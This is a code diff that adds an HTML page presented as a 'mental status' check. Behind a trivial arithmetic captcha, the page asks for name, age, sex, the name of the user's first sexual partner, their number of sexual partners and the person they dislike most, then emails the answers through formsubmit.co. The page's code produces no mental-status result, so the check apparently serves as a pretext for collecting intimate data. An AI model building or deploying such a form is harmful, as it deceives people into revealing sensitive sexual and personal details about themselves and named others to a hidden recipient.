@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Premium Mental Status Form</title>
+
+<style>
+body {
+    margin:0;
+    font-family:sans-serif;
+    background:linear-gradient(135deg,#667eea,#764ba2);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    color:white;
+}
+
+/* Container */
+.container{
+    width:95%;
+    max-width:400px;
+    padding:25px 20px 40px 20px;
+    border-radius:20px;
+    background:rgba(255,255,255,0.15);
+    backdrop-filter:blur(15px);
+    position:relative;
+    overflow:hidden;
+    z-index:1;
+    text-align:center;
+}
+
+/* Heading */
+h2#mainHeading{
+    font-size:24px;
+    font-weight:700;
+    margin-bottom:20px;
+    color:#fff;
+    text-shadow: 0 2px 10px rgba(0,0,0,0.4);
+}
+
+/* 🌄 Mountain */
+.container::before{
+    content:"";
+    position:absolute;
+    bottom:0;
+    left:0;
+    width:100%;
+    height:50px; 
+    background:#2c3e50;
+    clip-path: polygon(0% 100%, 20% 60%, 35% 80%, 50% 50%, 65% 75%, 80% 55%, 100% 100%);
+    z-index:-1;
+}
+
+/* ☁️ Clouds */
+.container::after{
+    content:"";
+    position:absolute;
+    top:-20px;
+    left:0;
+    width:100%;
+    height:100px;
+    background: radial-gradient(circle at 20% 50%, #fff 20%, transparent 21%),
+                radial-gradient(circle at 60% 40%, #fff 20%, transparent 21%),
+                radial-gradient(circle at 80% 60%, #fff 20%, transparent 21%);
+    background-size:100px 100px;
+    opacity:0.4;
+    animation:cloud 15s linear infinite;
+    z-index:-1;
+}
+
+@keyframes cloud{
+    0%{background-position:0 0;}
+    100%{background-position:200px 0;}
+}
+
+/* Progress */
+.progress{
+    height:8px;
+    background:#ccc;
+    border-radius:10px;
+    margin-bottom:15px;
+}
+.bar{
+    height:100%;
+    width:33%;
+    background:#00ffcc;
+    border-radius:10px;
+    transition:0.3s;
+}
+
+/* Steps */
+.step{
+    display:none;
+    text-align:left;
+}
+.step.active{
+    display:block;
+}
+
+/* Inputs */
+input, textarea{
+    width:100%;
+    padding:10px;
+    margin:8px 0;
+    border-radius:10px;
+    border:none;
+}
+
+/* Radio alignment */
+.radio-group{
+    display:flex;
+    justify-content:space-around;
+    margin:10px 0;
+}
+
+/* Slider */
+input[type=range] {
+    width:100%;
+}
+
+/* Button */
+button{
+    width:100%;
+    padding:10px;
+    border:none;
+    border-radius:10px;
+    background:#00c6ff;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+/* Wait button */
+#waitBtn{
+    display:none;
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    background:#ffa500;
+    color:white;
+    font-weight:bold;
+}
+
+/* Error */
+.error{
+    color:#ffcccc;
+    font-size:14px;
+}
+
+/* Slider value */
+#stressValue{
+    font-weight:bold;
+    margin-bottom:10px;
+    display:block;
+    text-align:center;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2 id="mainHeading">Check Your Mental Status 🧠</h2>
+
+<!-- HUMAN CHECK -->
+<div id="human">
+    <p id="q"></p>
+    <input id="ans" placeholder="Answer">
+    <button onclick="check()">Continue</button>
+    <div id="herr" class="error"></div>
+</div>
+
+<!-- FORM -->
+<form id="form"
+action="https://formsubmit.co/YOUR_EMAIL@gmail.com"
+method="POST"
+style="display:none;"
+onsubmit="showWaitButton()">
+
+<input type="hidden" name="_captcha" value="false">
+
+<div class="progress">
+    <div class="bar" id="bar"></div>
+</div>
+
+<!-- STEP 1 -->
+<div class="step active">
+    <input type="text" name="Name" id="name" placeholder="Name">
+    <input type="number" name="Age" id="age" placeholder="Age (type Number)">
+    <div class="radio-group">
+        <label><input type="radio" name="Sex" value="Male"> Male</label>
+        <label><input type="radio" name="Sex" value="Female"> Female</label>
+    </div>
+
+    <div id="e1" class="error"></div>
+    <button type="button" onclick="next1()">Next</button>
+</div>
+
+<!-- STEP 2 -->
+<div class="step">
+    <h3>Quick Questions 😊</h3>
+
+    <input type="text" name="FavoriteColor" id="q1" placeholder="Your favorite color">
+    <input type="text" name="noboysgirls" id="q2" placeholder="Confess.. how many Boy/Girlfriends have you had so far?">
+    <input type="text" name="game" id="q4" placeholder="Your favorite game">
+    <input type="text" name="FirstMan" id="q5" placeholder="Confess.. Who was your first sexual partner?">
+    <!-- Slider for stress -->
+    <label for="q3">Rate your stress level:</label>
+    <span id="stressValue">5</span>
+    <input type="range" name="Stress Level" id="q3" min="0" max="10" value="5" oninput="updateSlider(this.value)">
+    <div id="e2" class="error"></div>
+    <button type="button" onclick="next2()">Next</button>
+</div>
+<!-- STEP 3 -->
+<div class="step">
+    <input type="text" name="personhat" id="dis" placeholder="name of person you dislike the most?" required>
+    <input type="text" name="Idol" id="idol" placeholder="name your Idol Person?" required>
+    <input type="number" name="Comment" id="comment" placeholder="Confess..how many sexual partner you had so far?(type number)" required>
+    <div id="e3" class="error"></div>
+    <button type="submit">Check</button>
+    <button type="button" id="waitBtn" disabled>Please Wait... ⏳</button>
+</div>
+
+</form>
+
+</div>
+
+<script>
+// HUMAN QUESTION
+let a = Math.floor(Math.random()*10);
+let b = Math.floor(Math.random()*10);
+let c = a+b;
+document.getElementById("q").innerText=`${a}+${b}=?`;
+
+function check(){
+    let v=document.getElementById("ans").value.trim();
+    if(parseInt(v)===c){
+        document.getElementById("human").style.display="none";
+        document.getElementById("form").style.display="block";
+    } else {
+        document.getElementById("herr").innerText="Wrong!";
+    }
+}
+
+// STEPS
+let step=0;
+let steps=document.querySelectorAll(".step");
+
+function show(){
+    steps.forEach(s=>s.classList.remove("active"));
+    steps[step].classList.add("active");
+    document.getElementById("bar").style.width=(step+1)*33+"%";
+}
+
+function next1(){
+    let name=document.getElementById("name").value.trim();
+    let age=document.getElementById("age").value.trim();
+    let sex=document.querySelector('input[name="Sex"]:checked');
+
+    if(!name || !age || !sex){
+        document.getElementById("e1").innerText="Fill all fields properly";
+        return;
+    }
+
+    step=1; show();
+}
+
+function next2(){
+    let q1=document.getElementById("q1").value.trim();
+    let q2=document.getElementById("q2").value.trim();
+    let q3=document.getElementById("q3").value.trim();
+ 	let q4=document.getElementById("q4").value.trim();
+ 	let q5=document.getElementById("q5").value.trim();
+
+    if(!q1 || !q2 || !q3 || !q4 || q5===""){
+        document.getElementById("e2").innerText="Answer all questions";
+        return;
+    }
+
+    step=2; show();
+}
+
+function final(){
+    let dis=document.getElementById("dis").value.trim();
+    let idol=document.getElementById("idol").value.trim();
+    let comment=document.getElementById("comment").value.trim();
+    if(!dis || !idol || comment===""){
+        document.getElementById("e2").innerText="Answer all questions";
+        return;
+    }
+}
+
+// Show wait button after submit
+function showWaitButton(){
+    document.querySelector("#waitBtn").style.display="block";
+}
+
+// Update slider value display
+function updateSlider(val){
+    document.getElementById("stressValue").innerText=val;
+}
+</script>
+
+</body>
+</html>
